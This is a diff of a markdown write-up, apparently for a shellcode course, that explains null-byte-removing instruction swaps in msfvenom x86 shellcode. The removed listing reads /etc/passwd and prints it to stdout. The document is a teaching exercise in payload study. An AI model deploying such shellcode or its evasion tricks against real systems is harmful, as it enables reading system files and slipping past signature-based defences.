@@ -56,63 +56,64 @@ Here I have cleaned and commented the code, as well as put it in a .nasm format.
 
 I noticed there were a lot of null bytes in the shellcode generated from msfvenom, so my polymorphic code revolves around removing those null bytes.
 
-The first substitution I made is replacing an `xor` with a `sub`. Note that this strategy may not work with all CPUs.
+The first substitution I made is replacing an `xor` with a `sub` to zero out the `ecx` register. Note that this strategy may not work with all CPUs.
 
-```x86sam
-    ; xor ecx,ecx     ; replace xor instructions
-    sub ecx,ecx
+```x86asm
+; xor ecx,ecx     ; replace xor instruction
+sub ecx,ecx
 ```
-   
 
-    mov ebx,eax     ; ebx now holds file descriptor
+Then, I change the `mov, 0x3` witt an `xor` to clear the register and `mov al, 0x3` to move the value of 3 into the register without having zeros in the shellcode.
 
-    ; mov eax,0x3     ; read()
-    xor eax, eax
-    mov al, 0x3
-                    ; man 2 read
-                    ; ssize_t read(int fd, void *buf, size_t count);
-    mov edi,esp     
-    mov ecx,edi     ; ptr to stack : returned file content will fill this buffer
+```x86asm
+; mov eax,0x3     ; read()
+xor eax, eax
+mov al, 0x3
+```
+
+Similar to the above strategy, I remove a `mov edx, 0x1000` with a `mov dh, 0x10` to remove nulls in the shellcode and have the same result.
+
+```x86asm
     ; mov edx,0x1000  ; buf = 4096
     mov dh, 0x10
-    int 0x80        ; call read()
-
-    mov edx,eax     ; edx holds number of bytes returned from read()
-
-    ; mov eax,0x4     ; cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep " 4$"
-    xor eax, eax
-    mov al, 0x4 
-                    ; write()
-                    ; man 2 write
-                    ; ssize_t write(int fd, const void *buf, size_t count);
-    ; mov ebx,0x1     ; 1 = stdout (where to write output)
-    xor ebx, ebx
-    inc ebx
-
-    int 0x80        ; call write() 
-                    ; NOTE: ecx still points to stack (buffer to write)
-
-    ; mov eax,0x1     ; cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep " 1$"
-    xor eax, eax
-    inc eax
-
-                    ; man exit
-                    ; void exit(int status);
-    ; mov ebx,0x0     ; status = 0 = EXIT_SUCCESS
-    xor ebx, ebx
-
-    int 0x80        ; call exit()
-
-_jump1:
-    call _main    ; jump to main
-    db  "/etc/passwd", 0x00
 ```
 
+I again use the same trick as before to replace the `mov eax, 0x4` instruction:
+   
+```x86asm
+; mov eax,0x4     
+xor eax, eax
+mov al, 0x4 
+```
+   
+And again with ebx. Except this time since I need a value of 1 in the register, I will use the `inc` instruction to increment it after setting it to 0x0.
 
+```x86asm
+; mov ebx,0x1     ; 1 = stdout (where to write output)
+xor ebx, ebx
+inc ebx
+```
+
+I do the same thing for the eax register later in the assembly code.
+
+```x86asm
+; mov eax,0x1 
+xor eax, eax
+inc eax
+```
+
+I then replace a `mov ebx, 0x0` with an `xor` to remove null bytes in this instruction.
+
+```x86asm
+; mov ebx,0x0     ; status = 0 = EXIT_SUCCESS
+xor ebx, ebx
+```
+
+And that's it for the changes.
 
 ## Disassembled (Cleaned and commented)
 
-Here I have cleaned and commented the code
+Here I have cleaned and commented the final `.asm` code. I have left the instructions I replaced commented out.
 
 ```x86asm
 global _start
